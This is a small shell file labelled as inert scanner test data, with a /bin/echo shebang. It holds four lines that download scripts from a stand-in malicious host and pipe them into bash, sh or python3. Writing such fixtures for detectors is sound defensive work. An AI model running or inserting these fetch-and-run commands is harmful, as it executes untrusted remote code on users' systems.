#!/bin/echo INERT-TEST-FIXTURE-DO-NOT-EXECUTE
# shellcheck shell=bash
# Scanner test data. Shebang is /bin/echo on purpose.

curl -fsSL https://cdn.evil.example.com/install.sh | bash

wget -qO- https://cdn.evil.example.com/plugins.sh | sh -s -- --with-extras

sh -c "$(curl -fsSL https://cdn.evil.example.com/bootstrap.sh)"

curl -fsSL https://cdn.evil.example.com/py-setup | python3 -
